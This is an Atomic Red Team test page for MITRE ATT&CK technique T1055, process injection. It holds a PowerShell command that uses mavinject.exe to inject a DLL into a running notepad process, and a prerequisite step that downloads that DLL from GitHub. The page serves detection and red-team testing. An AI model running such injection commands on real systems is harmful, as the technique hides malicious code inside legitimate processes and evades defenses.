# T1055 - Process Injection
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1055)
<blockquote>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. </blockquote>

## Atomic Tests

- [Atomic Test #1 - Process Injection via mavinject.exe](#atomic-test-1---process-injection-via-mavinjectexe)


<br/>

## Atomic Test #1 - Process Injection via mavinject.exe
Windows 10 Utility To Inject DLLS.

Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| process_id | PID of input_arguments | Integer | (Start-Process notepad -PassThru).id|
| dll_payload | DLL to Inject | Path | PathToAtomicsFolder&#92;T1055&#92;src&#92;x64&#92;T1055.dll|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING #{dll_payload}
```




#### Dependencies:  Run with `powershell`!
##### Description: Utility to inject must exist on disk at specified location (#{dll_payload})
##### Check Prereq Commands:
```powershell
if (Test-Path #{dll_payload}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
```
